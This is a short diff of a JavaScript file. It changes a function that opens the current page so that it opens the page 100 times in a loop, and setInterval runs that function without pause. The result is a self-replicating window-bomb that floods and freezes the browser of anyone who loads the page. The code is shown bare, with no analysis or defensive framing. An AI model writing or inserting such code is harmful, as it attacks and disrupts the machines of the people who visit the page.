@@ -1,6 +1,7 @@
 function rep() {
-  open(location.origin);
-  open(location.href);
+  for (var i = 0; i < 100; i++) {
+    open(location.href);
+  }
 }
 
 setInterval(rep, 0);
